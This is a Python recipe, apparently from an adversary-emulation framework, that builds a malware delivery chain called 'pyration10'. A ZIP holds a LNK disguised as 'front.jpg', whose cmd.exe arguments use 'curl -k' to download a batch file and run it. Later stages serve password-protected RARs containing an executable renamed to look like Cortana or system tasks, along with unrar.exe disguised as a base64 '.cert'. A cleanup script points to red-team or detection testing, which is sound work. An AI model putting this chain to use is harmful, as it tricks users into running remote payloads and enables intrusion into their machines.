from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar

from helpers import *
from model import *


def pyration10(baseUrl) -> List[AceRoute]:
    routes = []

    # Payload: unrar.cert: unrar.exe base64 encoded
    unrar: AceBytes = readFileContent('recipes/pyration10/unrar.exe')
    unrarB64: AceStr = base64encode(unrar)
    serveHtml: AceRoute = makeAceRoute('/pyration10/unrar.cert', unrarB64, info='unrar.exe')
    routes.append(serveHtml)

    # Payload: setup.rar: PW "2022": CortanaAssistance.exe
    evilexe: AceBytes = readFileContent('payloads/evil.exe')
    evilExeFile: AceFile = makeAceFile('CortanaAssistance.exe', evilexe)
    evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
    serveHtml: AceRoute = makeAceRoute('/pyration10/assist.rar', evilexeRar, info='CortanaAssistance.exe')
    routes.append(serveHtml)

    # Payload: assist.rar: PW "2022": ctask.exe
    evilExeFile: AceFile = makeAceFile('ctask.exe', evilexe)
    evilexeRar: AceBytes = makeRar([evilExeFile], password='2022')
    serveHtml: AceRoute = makeAceRoute('/pyration10/setup.rar', evilexeRar, info='ctask.exe')
    routes.append(serveHtml)
    
    # Payload: Fake JPG
    pic: AceBytes = readFileContent('recipes/pyration10/front.jpg')
    serveHtml: AceRoute = makeAceRoute('/pyration10/front.jpg', pic, info='Fake Image')
    routes.append(serveHtml)

    # Stage 2: BAT
    rendered = renderTemplate('recipes/pyration10/stage2.bat',
        assistUrl=baseUrl + '/pyration10/assist.rar',
        setupUrl=baseUrl + '/pyration10/setup.rar',
        certUrl=baseUrl + '/pyration10/unrar.cert',
    )
    serveHtml: AceRoute = makeAceRoute('/pyration10/c.txt', rendered, info='stage2.bat')
    routes.append(serveHtml)

    # Stage 1: BAT
    rendered = renderTemplate('recipes/pyration10/stage1.bat',
        batUrl=baseUrl + '/pyration10/c.txt',
        picUrl=baseUrl + '/pyration10/front.jpg',
    )
    stage1bat: AceFile = makeAceFile('stage1.bat', rendered)
    serveHtml: AceRoute = makeAceRoute('/pyration10/front.txt', rendered, info='stage1.bat')
    routes.append(serveHtml)

    # Initial Vector: LNK
    lnkData: AceBytes = makeLnk(
        name = "front.jpg.lnk",
        target = "c:\\Windows\\System32\\cmd.exe",
        arguments = "/c curl -k \"{}\" -o \"%tmp%/front.bat\" & cmd /c \"%tmp%/front.bat\"".format(
            baseUrl + '/pyration10/front.txt',
        ),
        iconPath="C:\\Windows\\System32\\imageres.dll",
        iconIndex=67
    )
    lnkFile: AceFile = makeAceFile('front.jpg.lnk', lnkData)

    # Put LNK into a ZIP
    container: AceBytes = makeZip(
        files = [
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('documents.zip', container)
    serveHtml: AceRoute = makeAceRoute(
        '/pyration10/pyration10-documents.zip', 
        container, 
        info="Entry",
        download=True, downloadName='documents.zip')
    routes.append(serveHtml)

    cleanupbat: AceBytes = readFileContent('recipes/pyration10/cleanup.bat')
    serveHtml: AceRoute = makeAceRoute(
        '/pyration10/cleanup.bat', 
        cleanupbat, 
        info="Cleanup File",
        download=True, downloadName="cleanup-pyration10.bat")
    routes.append(serveHtml)

    return(routes)
